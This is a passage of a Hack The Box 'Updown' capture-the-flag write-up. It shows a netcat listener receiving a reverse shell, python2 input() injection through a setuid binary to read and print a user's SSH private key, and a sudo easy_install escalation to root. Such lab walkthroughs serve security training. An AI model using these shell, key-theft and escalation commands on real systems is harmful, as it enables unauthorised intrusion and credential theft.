+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;command returned </span><span class="nv">$return_value</span><span class="s2">\n&quot;</span><span class="p">;</span>
+<span class="o">}</span>
+?&gt;
+</pre></div>
+</div>
+<p>We’re now www-data</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>rlwrap nc -lvnp 4242
+listening on [any] 4242 ...
+connect to [10.10.14.35] from (UNKNOWN) [10.10.11.177] 34648
+sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd
+/var/www/dev/uploads/f5d699dc4397dd6e8d124b297fc3576b
+$
+</pre></div>
+</div>
+</section>
+<section id="horizontal-privilege-escalation-with-python2-input-and-setuid">
+<h2>Horizontal privilege escalation with python2 input() and setuid<a class="headerlink" href="#horizontal-privilege-escalation-with-python2-input-and-setuid" title="Permalink to this heading">#</a></h2>
+<p>There’s this python2 script, in developer’s home folder, it’s using input(), so you know where this is going</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span><span class="nb">pwd</span>
+/home/developer/dev
+$
+$
+$<span class="w"> </span>cat<span class="w"> </span>siteisup_test.py
+import<span class="w"> </span>requests
+
+<span class="nv">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>input<span class="o">(</span><span class="s2">&quot;Enter URL here:&quot;</span><span class="o">)</span>
+<span class="nv">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span>url<span class="o">)</span>
+<span class="k">if</span><span class="w"> </span>page.status_code<span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="m">200</span>:
+<span class="w">        </span>print<span class="w"> </span><span class="s2">&quot;Website is up&quot;</span>
+<span class="k">else</span>:
+<span class="w">        </span>print<span class="w"> </span><span class="s2">&quot;Website is down&quot;</span>$
+$
+$
+</pre></div>
+</div>
+<p>Next to it is an elf binary of the same name, which is a setuid for developer, when attempting to run it, it seems to be calling the python script, and by extension the input() call.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">32</span>
+drwxr-x---<span class="w"> </span><span class="m">2</span><span class="w"> </span>developer<span class="w"> </span>www-data<span class="w">   </span><span class="m">4096</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:45<span class="w"> </span>.
+drwxr-xr-x<span class="w"> </span><span class="m">6</span><span class="w"> </span>developer<span class="w"> </span>developer<span class="w">  </span><span class="m">4096</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="m">11</span>:24<span class="w"> </span>..
+-rwsr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>developer<span class="w"> </span>www-data<span class="w">  </span><span class="m">16928</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:45<span class="w"> </span>siteisup
+-rwxr-x---<span class="w"> </span><span class="m">1</span><span class="w"> </span>developer<span class="w"> </span>www-data<span class="w">    </span><span class="m">154</span><span class="w"> </span>Jun<span class="w"> </span><span class="m">22</span><span class="w"> </span><span class="m">15</span>:45<span class="w"> </span>siteisup_test.py
+$<span class="w"> </span>file<span class="w"> </span>siteisup
+siteisup:<span class="w"> </span>setuid<span class="w"> </span>ELF<span class="w"> </span><span class="m">64</span>-bit<span class="w"> </span>LSB<span class="w"> </span>shared<span class="w"> </span>object,<span class="w"> </span>x86-64,<span class="w"> </span>version<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>SYSV<span class="o">)</span>,<span class="w"> </span>dynamically<span class="w"> </span>linked,<span class="w"> </span>interpreter<span class="w"> </span>/lib64/ld-linux-x86-64.so.2,<span class="w"> </span>BuildID<span class="o">[</span>sha1<span class="o">]=</span>b5bbc1de286529f5291b48db8202eefbafc92c1f,<span class="w"> </span><span class="k">for</span><span class="w"> </span>GNU/Linux<span class="w"> </span><span class="m">3</span>.2.0,<span class="w"> </span>not<span class="w"> </span>stripped
+$
+$
+$<span class="w"> </span>./siteisup
+asdfasdf
+Enter<span class="w"> </span>URL<span class="w"> </span>here:Traceback<span class="w"> </span><span class="o">(</span>most<span class="w"> </span>recent<span class="w"> </span>call<span class="w"> </span>last<span class="o">)</span>:
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/home/developer/dev/siteisup_test.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">3</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>&lt;module&gt;
+<span class="w">    </span><span class="nv">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>input<span class="o">(</span><span class="s2">&quot;Enter URL here:&quot;</span><span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;&lt;string&gt;&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">1</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>&lt;module&gt;
+NameError:<span class="w"> </span>name<span class="w"> </span><span class="s1">&#39;asdfasdf&#39;</span><span class="w"> </span>is<span class="w"> </span>not<span class="w"> </span>defined
+Welcome<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;siteisup.htb&#39;</span><span class="w"> </span>application
+
+$
+</pre></div>
+</div>
+<p>After trying a bunch of things from the hacktricks page on python sandbox evasions, we get command execution as developer, and we can steal his ssh private key:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>$<span class="w"> </span>./siteisup
+__import__<span class="o">(</span><span class="s2">&quot;os&quot;</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">&#39;cat ../.ssh/id_rsa&#39;</span><span class="o">)</span>
+-----BEGIN<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEAmvB40TWM8eu0n6FOzixTA1pQ39SpwYyrYCjKrDtp8g5E05EEcJw/
+S1qi9PFoNvzkt7Uy3++6xDd95ugAdtuRL7qzA03xSNkqnt2HgjKAPOr6ctIvMDph8JeBF2
+F9Sy4XrtfCP76+WpzmxT7utvGD0N1AY3+EGRpOb7q59X0pcPRnIUnxu2sN+vIXjfGvqiAY
+ozOB5DeX8rb2bkii6S3Q1tM1VUDoW7cCRbnBMglm2FXEJU9lEv9Py2D4BavFvoUqtT8aCo
+********************************SNIP**********************************
+gNyFi4s68suDESmL5FCOWUuklrpkNENk7jzjhlzs3gdfU0IRCVpfmiT7LDGwX9YLfsVXtJ
+mtpd5SG55TJuGJqXCyeM+U0DBdxsT5AAAAwQDDfs/CULeQUO+2Ij9rWAlKaTEKLkmZjSqB
+2d9yJVHHzGPe1DZfRu0nYYonz5bfqoAh2GnYwvIp0h3nzzQo2Svv3/ugRCQwGoFP1zs1aa
+ZSESqGN9EfOnUqvQa317rHnO3moDWTnYDbynVJuiQHlDaSCyf+uaZoCMINSG5IOC/4Sj0v
+3zga8EzubgwnpU7r9hN2jWboCCIOeDtvXFv08KT8pFDCCA+sMa5uoWQlBqmsOWCLvtaOWe
+N4jA+ppn1+3e0AAAASZGV2ZWxvcGVyQHNpdGVpc3VwAQ<span class="o">==</span>
+-----END<span class="w"> </span>OPENSSH<span class="w"> </span>PRIVATE<span class="w"> </span>KEY-----
+Enter<span class="w"> </span>URL<span class="w"> </span>here:Traceback<span class="w"> </span><span class="o">(</span>most<span class="w"> </span>recent<span class="w"> </span>call<span class="w"> </span>last<span class="o">)</span>:
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/home/developer/dev/siteisup_test.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">4</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>&lt;module&gt;
+<span class="w">    </span><span class="nv">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>requests.get<span class="o">(</span>url<span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/api.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">75</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>get
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>request<span class="o">(</span><span class="s1">&#39;get&#39;</span>,<span class="w"> </span>url,<span class="w"> </span><span class="nv">params</span><span class="o">=</span>params,<span class="w"> </span>**kwargs<span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/api.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">61</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>request
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>session.request<span class="o">(</span><span class="nv">method</span><span class="o">=</span>method,<span class="w"> </span><span class="nv">url</span><span class="o">=</span>url,<span class="w"> </span>**kwargs<span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/sessions.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">515</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>request
+<span class="w">    </span><span class="nv">prep</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>self.prepare_request<span class="o">(</span>req<span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/sessions.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">453</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>prepare_request
+<span class="w">    </span><span class="nv">hooks</span><span class="o">=</span>merge_hooks<span class="o">(</span>request.hooks,<span class="w"> </span>self.hooks<span class="o">)</span>,
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/models.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">318</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>prepare
+<span class="w">    </span>self.prepare_url<span class="o">(</span>url,<span class="w"> </span>params<span class="o">)</span>
+<span class="w">  </span>File<span class="w"> </span><span class="s2">&quot;/usr/local/lib/python2.7/dist-packages/requests/models.py&quot;</span>,<span class="w"> </span>line<span class="w"> </span><span class="m">392</span>,<span class="w"> </span><span class="k">in</span><span class="w"> </span>prepare_url
+<span class="w">    </span>raise<span class="w"> </span>MissingSchema<span class="o">(</span>error<span class="o">)</span>
+requests.exceptions.MissingSchema:<span class="w"> </span>Invalid<span class="w"> </span>URL<span class="w"> </span><span class="s1">&#39;0&#39;</span>:<span class="w"> </span>No<span class="w"> </span>scheme<span class="w"> </span>supplied.<span class="w"> </span>Perhaps<span class="w"> </span>you<span class="w"> </span>meant<span class="w"> </span>http://0?
+Welcome<span class="w"> </span>to<span class="w"> </span><span class="s1">&#39;siteisup.htb&#39;</span><span class="w"> </span>application
+</pre></div>
+</div>
+</section>
+<section id="vertical-privilege-escalation-with-sudo-no-pass-on-python-easy-install">
+<h2>Vertical privilege escalation with sudo no pass on python easy install<a class="headerlink" href="#vertical-privilege-escalation-with-sudo-no-pass-on-python-easy-install" title="Permalink to this heading">#</a></h2>
+<p>Looking at our sudo privileges, there’s easy install no pass as root, cool that’s a GTFO bin.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>developer<span class="w"> </span>on<span class="w"> </span>localhost:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User<span class="w"> </span>developer<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>localhost:
+<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/local/bin/easy_install
+</pre></div>
+</div>
+<p><a class="reference external" href="https://gtfobins.github.io/gtfobins/easy_install/">https://gtfobins.github.io/gtfobins/easy_install/</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>developer@updown:/dev/shm$<span class="w"> </span><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="k">)</span>
+developer@updown:/dev/shm$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> &gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> 2&gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2">&#39;)&quot;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$TF</span>/setup.py
+developer@updown:/dev/shm$<span class="w"> </span>sudo<span class="w"> </span>easy_install<span class="w"> </span><span class="nv">$TF</span>
+WARNING:<span class="w"> </span>The<span class="w"> </span>easy_install<span class="w"> </span><span class="nb">command</span><span class="w"> </span>is<span class="w"> </span>deprecated<span class="w"> </span>and<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>removed<span class="w"> </span><span class="k">in</span><span class="w"> </span>a<span class="w"> </span>future<span class="w"> </span>version.
+Processing<span class="w"> </span>tmp.XSVaEzRIHG
+Writing<span class="w"> </span>/tmp/tmp.XSVaEzRIHG/setup.cfg
+Running<span class="w"> </span>setup.py<span class="w"> </span>-q<span class="w"> </span>bdist_egg<span class="w"> </span>--dist-dir<span class="w"> </span>/tmp/tmp.XSVaEzRIHG/egg-dist-tmp-zlsf7d
+<span class="c1"># id</span>
+<span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">0</span><span class="o">(</span>root<span class="o">)</span>
+<span class="c1">#</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../zipping/zipping.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Zipping</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../shared/shared.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Shared</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Updown</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#sensitive-information-disclosure-git-repo">Sensitive Information Disclosure - Git repo</a></li>
+<li><a class="reference internal" href="#source-code-review">Source code Review</a></li>
+<li><a class="reference internal" href="#from-file-upload-filter-evasion-and-predictable-upload-path-to-rce">From file upload filter evasion and predictable upload path to RCE</a></li>
+<li><a class="reference internal" href="#exploring-system-files-with-the-rce">Exploring system files with the RCE</a></li>
+<li><a class="reference internal" href="#further-enumeraton-of-the-php-server">Further enumeraton of the PHP Server</a></li>
+<li><a class="reference internal" href="#php-reverse-shell-with-proc-open-only">PHP reverse shell with proc-open only</a></li>
+<li><a class="reference internal" href="#horizontal-privilege-escalation-with-python2-input-and-setuid">Horizontal privilege escalation with python2 input() and setuid</a></li>
+<li><a class="reference internal" href="#vertical-privilege-escalation-with-sudo-no-pass-on-python-easy-install">Vertical privilege escalation with sudo no pass on python easy install</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
